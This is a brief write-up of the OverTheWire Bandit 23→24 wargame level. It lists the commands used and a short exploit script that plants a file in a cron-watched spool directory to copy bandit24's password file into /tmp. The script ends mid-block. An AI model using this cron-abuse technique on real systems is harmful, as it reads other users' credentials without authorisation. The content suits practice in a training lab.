# Bandit Level 23 → Level 24

**Date:** 2026-07-29

## Goal
Write a shell script that exploits a cron job running with bandit24 privileges to steal the password.

## Commands Used

| Command | Purpose |
|---------|---------|
| `ssh bandit23@bandit.labs.overthewire.org -p 2220` | Log into Level 23 |
| `cat /usr/bin/cronjob_bandit24.sh` | Read the cron script |
| `cat &gt; /tmp/myscript.sh &lt;&lt; 'EOF'` | Write exploit script |
| `cp /tmp/myscript.sh /var/spool/bandit24/foo/` | Place script in target directory |
| `chmod +x /var/spool/bandit24/foo/myscript.sh` | Make executable |
| `cat /tmp/bandit24_password` | Read stolen password |
| `exit` | Log out |

## Exploit Script
```bash
#!/bin/bash
cat /etc/bandit_pass/bandit24 &gt; /tmp/bandit24_password
